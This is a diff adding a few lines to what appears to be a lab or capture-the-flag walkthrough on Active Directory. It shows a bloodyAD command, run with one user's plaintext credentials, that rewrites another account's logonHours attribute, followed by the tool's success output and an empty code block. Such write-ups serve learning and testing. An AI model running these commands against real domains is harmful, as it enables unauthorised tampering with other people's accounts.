@@ -348,3 +348,14 @@ permission: CREATE_CHILD
 
 As seen here the user `luke.harrison` can write to `jason.caldwell`
 
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 'Password123' -k set object 'jason.caldwell' logonhours -v '////////////////////////////' --b64
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+[+] jason.caldwell's logonHours has been updated
+```
+
+Then using bloodyAD once again as `luke.harrison` i can reset his logon hours
+
+```python
+
+```
